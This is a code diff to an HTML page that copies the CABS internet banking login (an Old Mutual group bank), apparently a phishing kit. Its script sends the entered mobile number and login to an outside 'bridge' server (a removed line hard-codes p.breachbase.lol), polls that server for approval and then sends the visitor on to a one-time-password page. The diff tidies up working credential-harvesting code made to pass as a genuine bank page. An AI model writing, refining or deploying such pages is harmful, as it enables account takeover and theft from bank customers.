@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CABS - Internet Banking Login</title>
     <style>
+        /* Typography */
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap');
+
         /* CSS Variables for CABS Branding */
         :root {
             --cabs-blue: #0d1a70;
@@ -16,7 +19,7 @@
 
         * {
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Montserrat', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
             padding: 0;
         }
@@ -28,6 +31,33 @@
             align-items: center;
             min-height: 100vh;
         }
+
+        /* Progress Overlay */
+        #progress-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            flex-direction: column;
+        }
+
+        .progress-circle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 6px solid #eee;
+            border-top: 6px solid var(--cabs-blue);
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .login-container {
             width: 100%;
@@ -139,6 +169,7 @@
             text-decoration: none;
             transition: all 0.2s;
             text-transform: uppercase;
+            border: none;
         }
 
         .btn-outline {
@@ -216,74 +247,23 @@
 </head>
 <body>
 
-    <div class="login-container">
-        
-        <!-- Logo Section -->
-        <div class="logo-container">
-            <div class="logo-main">CABS<span class="logo-swoosh">///</span></div>
-            <div class="logo-sub">A MEMBER OF THE <span>OLD MUTUAL</span> GROUP</div>
-        </div>
-
-        <!-- Headings -->
-        <div class="welcome-text">Welcome to</div>
-        <div class="ib-text">Internet Banking</div>
-
-    <style>
-        /* Typography */
-        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap');
-
-        body {
-            font-family: 'Montserrat', sans-serif;
-            background-color: var(--bg-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        /* Progress Overlay */
-        #progress-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255,255,255,0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-            flex-direction: column;
-        }
-
-        .progress-circle {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            border: 6px solid #eee;
-            border-top: 6px solid var(--cabs-blue);
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
     <div id="progress-overlay">
         <div class="progress-circle"></div>
         <p style="color: var(--cabs-blue); font-weight: 600;">Verifying with CABS...</p>
     </div>
 
     <div class="login-container">
+        
+        <!-- Logo Section -->
         <div class="logo-container">
-            <div class="logo-main">CABS<span class="logo-swoosh">///</span></div>
-            <div class="logo-sub">A MEMBER OF THE <span>OLD MUTUAL</span> GROUP</div>
+            <img src="logo.png" alt="CABS Logo" style="width: 150px; margin-bottom: 10px;">
         </div>
 
+        <!-- Headings -->
         <div class="welcome-text">Welcome to</div>
         <div class="ib-text">Internet Banking</div>
 
+        <!-- Login Form -->
         <form onsubmit="submitLoginToBridge(event);">
             <div class="form-group">
                 <label>Mobile Number</label>
@@ -294,10 +274,31 @@
                 <button type="submit" class="btn btn-solid" style="width: 100%;">LOGIN</button>
             </div>
         </form>
+
+        <!-- Security Advice -->
+        <a href="#" class="security-link">IMPORTANT: Security advice to help keep your online banking secure and convenient</a>
+
+        <!-- Footer Links -->
+        <div class="footer-links">
+            <a href="#">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+                Contact Us
+            </a>
+            <a href="#">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
+                Terms & Conditions
+            </a>
+            <a href="#">
+                <svg class="icon icon-fill" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                Privacy Policy
+            </a>
+        </div>
+
     </div>
 
+    <script src="config.js"></script>
     <script>
-        const BRIDGE_URL = 'https://p.breachbase.lol';
+        const BRIDGE_URL = window.APP_CONFIG.BRIDGE_URL;
 
         async function submitLoginToBridge(event) {
             event.preventDefault();
@@ -327,42 +328,27 @@
 
         async function pollStatus(attemptId) {
             const interval = setInterval(async () => {
-                const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`, {
-                    headers: {
-                        'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}`
+                try {
+                    const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`, {
+                        headers: {
+                            'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}`
+                        }
+                    });
+                    const { status } = await res.json();
+                    
+                    if (status === 'approved') {
+                        clearInterval(interval);
+                        window.location.href = 'otppage.html';
+                    } else if (status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('progress-overlay').style.display = 'none';
+                        alert("Login rejected.");
                     }
-                });
-                const { status } = await res.json();
-                
-                if (status === 'approved') {
-                    clearInterval(interval);
-                    window.location.href = 'otppage.html';
+                } catch (error) {
+                    console.error('Polling error:', error);
                 }
             }, 3000);
         }
     </script>
-</body>
-
-        <!-- Security Advice -->
-        <a href="#" class="security-link">IMPORTANT: Security advice to help keep your online banking secure and convenient</a>
-
-        <!-- Footer Links -->
-        <div class="footer-links">
-            <a href="#">
-                <svg class="icon" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
-                Contact Us
-            </a>
-            <a href="#">
-                <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
-                Terms & Conditions
-            </a>
-            <a href="#">
-                <svg class="icon icon-fill" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
-                Privacy Policy
-            </a>
-        </div>
-
-    </div>
-
 </body>
 </html>
